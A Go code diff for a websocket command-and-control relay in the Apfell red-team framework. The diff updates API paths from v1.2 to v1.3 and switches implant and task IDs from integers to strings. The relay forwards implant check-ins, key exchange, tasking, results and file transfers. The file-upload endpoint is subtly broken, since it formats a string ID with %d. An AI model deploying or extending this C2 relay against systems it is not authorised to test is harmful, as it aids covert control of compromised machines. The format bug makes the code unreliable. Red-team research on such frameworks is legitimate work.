@@ -10,7 +10,6 @@ import (
 	"math"
 	"net/http"
 	"os"
-	"strconv"
 	"strings"
 	"time"
 
@@ -66,14 +65,14 @@ func (s *WebsocketC2) SetSocketURI(uri string) {
 	s.SocketURI = uri
 }
 
-func (s WebsocketC2) GetNextTask(apfellID int) []byte {
+func (s WebsocketC2) GetNextTask(apfellID string) []byte {
 	//place holder
-	url := fmt.Sprintf("%sapi/v1.2/tasks/callback/%d/nextTask", s.ApfellBaseURL(), apfellID)
+	url := fmt.Sprintf("%sapi/v1.3/tasks/callback/%s/nextTask", s.ApfellBaseURL(), apfellID)
 	return s.htmlGetData(url)
 }
 
-func (s WebsocketC2) PostResponse(taskid int, output []byte) []byte {
-	urlEnding := fmt.Sprintf("api/v1.2/responses/%d", taskid)
+func (s WebsocketC2) PostResponse(taskid string, output []byte) []byte {
+	urlEnding := fmt.Sprintf("api/v1.3/responses/%s", taskid)
 	return s.postRESTResponse(urlEnding, output)
 }
 
@@ -171,7 +170,7 @@ func (s *WebsocketC2) htmlGetData(url string) []byte {
 
 }
 
-func (s WebsocketC2) SendClientMessage(apfellID int, data []byte) {
+func (s WebsocketC2) SendClientMessage(apfellID string, data []byte) {
 
 }
 
@@ -208,7 +207,7 @@ func (s WebsocketC2) SocketHandler(w http.ResponseWriter, r *http.Request) {
 
 func (s *WebsocketC2) manageClient(c *websocket.Conn) {
 	defer func() { _ = c.Close() }()
-	var apfellid int
+	var apfellid string
 
 LOOP:
 	for {
@@ -229,7 +228,7 @@ LOOP:
 				break LOOP
 			}
 
-			resp := s.htmlPostData("api/v1.2/callbacks/", []byte(m.Data))
+			resp := s.htmlPostData("api/v1.3/callbacks/", []byte(m.Data))
 
 			// Create the msg to respond to the client
 			re := Message{}
@@ -255,7 +254,7 @@ LOOP:
 
 			if m.IDType == UUIDType {
 				// Post the RSA Pub key to apfell and return the new AES key
-				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/crypto/EKE/%s", m.ID), []byte(m.Data))
+				resp := s.htmlPostData(fmt.Sprintf("api/v1.3/crypto/EKE/%s", m.ID), []byte(m.Data))
 				if len(resp) == 0 {
 					s.Websocketlog("Received empty response from apfell, exiting..")
 					break LOOP
@@ -274,7 +273,7 @@ LOOP:
 
 			if m.IDType == SESSIDType {
 				// Post the encrypted checkin data to apfell and return the checkin metadata
-				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/crypto/EKE/%s", m.ID), []byte(m.Data))
+				resp := s.htmlPostData(fmt.Sprintf("api/v1.3/crypto/EKE/%s", m.ID), []byte(m.Data))
 				if len(resp) == 0 {
 					s.Websocketlog("Received empty response from apfell, exiting..")
 					break LOOP
@@ -301,7 +300,7 @@ LOOP:
 			}
 
 			if m.IDType == UUIDType {
-				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/crypto/aes_psk/%s", m.ID), []byte(m.Data))
+				resp := s.htmlPostData(fmt.Sprintf("api/v1.3/crypto/aes_psk/%s", m.ID), []byte(m.Data))
 				if len(resp) == 0 {
 					s.Websocketlog("Received empty response from apfell, exiting..")
 					break LOOP
@@ -322,15 +321,14 @@ LOOP:
 		case TaskMsg:
 			// Handle task request from client
 			if m.IDType == ApfellIDType {
-				i, _ := strconv.Atoi(m.ID)
-				apfellid = i
-				resp := s.GetNextTask(i)
+				apfellid = m.ID
+				resp := s.GetNextTask(m.ID)
 
 				if len(resp) == 0 {
 					s.Websocketlog("Received empty response from Apfell.... retrying ")
 					time.Sleep(time.Duration(s.PollingInterval()) * time.Second)
 
-					resp = s.GetNextTask(i)
+					resp = s.GetNextTask(apfellid)
 				}
 
 				re := Message{}
@@ -348,8 +346,7 @@ LOOP:
 		case ResponseMsg:
 			// Handle task responses
 			if m.IDType == TASKIDType {
-				i, _ := strconv.Atoi(m.ID)
-				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/responses/%d", i), []byte(m.Data))
+				resp := s.htmlPostData(fmt.Sprintf("api/v1.3/responses/%s", m.ID), []byte(m.Data))
 
 				re := Message{}
 				re.Data = string(resp)
@@ -366,8 +363,7 @@ LOOP:
 		case FileMsg:
 			// Handle file uploads
 			if m.IDType == FileIDType {
-				i, _ := strconv.Atoi(m.ID)
-				endpoint := fmt.Sprintf("api/v1.2/files/%d/callbacks/%d", i, apfellid)
+				endpoint := fmt.Sprintf("api/v1.3/files/%d/callbacks/%s", m.ID, apfellid)
 				url := fmt.Sprintf("%s%s", s.ApfellBaseURL(), endpoint)
 				resp := s.htmlGetData(url)
 
@@ -384,6 +380,8 @@ LOOP:
 			break
 		}
 	}
+
+	c.Close()
 
 }
 
